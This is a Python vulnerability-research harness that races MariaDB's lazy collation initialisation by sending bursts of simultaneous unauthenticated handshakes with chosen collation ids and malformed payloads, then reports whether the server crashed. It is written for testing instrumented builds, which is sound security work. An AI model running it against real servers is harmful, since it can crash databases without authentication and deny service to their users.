#!/usr/bin/env python3
"""
Race the lazy initialisation of a collation from unauthenticated connections.

Found by coverage differential, not by reading the code: comparing the
functions executed with pre-auth traffic against those executed by a bare
server start/stop showed my_coll_parser_scan_rule, my_coll_rules_realloc,
my_coll_rule_expand, my_uca_generate_page, my_char_weight_put, create_fromuni,
my_cset_init_8bit and friends in the pre-auth-only set. Those are the
collation/charset *builders*: they run the first time a collation is used.

thd_init_client_charset() calls get_charset(net->read_pos[8]) with the single
collation-id byte from the handshake response, so an unauthenticated client
chooses which collation gets initialised and when. And get_internal_charset()
uses double-checked locking:

    if (cs->state & MY_CS_READY)       /* read with no mutex held */
    {
      my_collation_statistics_inc_use_count(cs_number);
      return cs;
    }
    mysql_mutex_lock(&THR_LOCK_charset);
    ...
        if (my_ci_init_charset(cs, loader) || my_ci_init_collation(cs, loader))
          cs= NULL;
        else
          cs->state|= MY_CS_READY;     /* published last, under the mutex */
    mysql_mutex_unlock(&THR_LOCK_charset);

`cs->state` is a plain `uint` -- not atomic, not volatile, and there is no
release/acquire pairing -- so a thread taking the fast path can in principle
observe MY_CS_READY without observing the weight pages and handler data the
initialising thread wrote. Several weight lookups deliberately rely on pages
being non-NULL ("By adding these dummy pages we can avoid testing 'page'
against NULL", ctype-utf8.c).

This drives many unauthenticated connections at the *same* collation id at the
same instant, on a freshly started server so the id really is uninitialised,
and repeats for every id. Each burst pre-connects and pre-builds its packets,
then releases on a barrier, so the sends land as close together as possible.

Run against an instrumented build: the consequence to look for is an
out-of-bounds or NULL access inside the collation handlers, not the race itself.
"""

import os
import struct
import sys
import threading

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from mariadb_preauth import (  # noqa: E402
    Conn, server_alive, BASE_CAPS, CLIENT_PLUGIN_AUTH, CLIENT_CONNECT_WITH_DB,
)

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 3307
NRACE = int(sys.argv[3]) if len(sys.argv) > 3 else 24

CAPS = BASE_CAPS | CLIENT_PLUGIN_AUTH | CLIENT_CONNECT_WITH_DB

# Non-ASCII, multi-byte and truncated sequences, so that whichever collation
# wins the race is immediately asked to decode something non-trivial.
PAYLOAD = b"\xc3\xa9\xe4\xb8\xad\xf0\x9f\x98\x80\x81\x40\x8f\xa1\xfe\xfe\xa1"


def burst(cs_id, n):
    """n connections that all send collation id `cs_id` at once."""
    ready = threading.Barrier(n + 1)
    results = [None] * n

    def one(i):
        try:
            c = Conn(HOST, PORT, timeout=20.0)
        except OSError as exc:
            results[i] = f"connect:{exc}"
            try:
                ready.wait(timeout=30)
            except threading.BrokenBarrierError:
                pass
            return
        try:
            if c.read_greeting() is None:
                results[i] = "no-greeting"
                ready.wait(timeout=30)
                return
            pkt = c.build_handshake_response(
                caps=CAPS, charset=cs_id,
                user=b"race" + PAYLOAD, auth_data=b"",
                db=b"db" + PAYLOAD, plugin=b"mysql_native_password")
            # everything expensive done before the barrier
            ready.wait(timeout=30)
            c.send_packet(pkt)
            resp = c.read_packet()
            if resp is None:
                results[i] = "closed"
            elif resp[:1] == b"\xff":
                results[i] = f"err{struct.unpack('<H', resp[1:3])[0]}"
            else:
                results[i] = "other"
        except threading.BrokenBarrierError:
            results[i] = "barrier"
        except OSError as exc:
            results[i] = f"io:{exc}"
        finally:
            c.close()

    threads = [threading.Thread(target=one, args=(i,)) for i in range(n)]
    for t in threads:
        t.start()
    try:
        ready.wait(timeout=60)
    except threading.BrokenBarrierError:
        pass
    for t in threads:
        t.join(timeout=40)
    return results


def main():
    if not server_alive(HOST, PORT, 15.0):
        print("server not reachable")
        return 2
    print(f"target {HOST}:{PORT}  racers per collation id={NRACE}")
    print("NOTE: start the server fresh before this, otherwise the collations")
    print("      are already initialised and there is nothing left to race.")
    dead = []
    for cs_id in range(1, 256):
        res = burst(cs_id, NRACE)
        bad = [r for r in res if r in (None, "closed", "barrier") or
               (r or "").startswith(("connect:", "io:", "no-greeting"))]
        if cs_id % 32 == 0 or bad:
            print(f"  id={cs_id:3d}  replies={len(res)-len(bad)}/{len(res)}"
                  + (f"  anomalies={bad[:4]}" if bad else ""))
        if not server_alive(HOST, PORT, 15.0):
            print(f"  [!!] SERVER DEAD racing collation id {cs_id}")
            dead.append(cs_id)
            return 1
    print(f"\ndone; dead-at={dead or 'none'}; "
          f"server alive={server_alive(HOST, PORT, 20.0)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
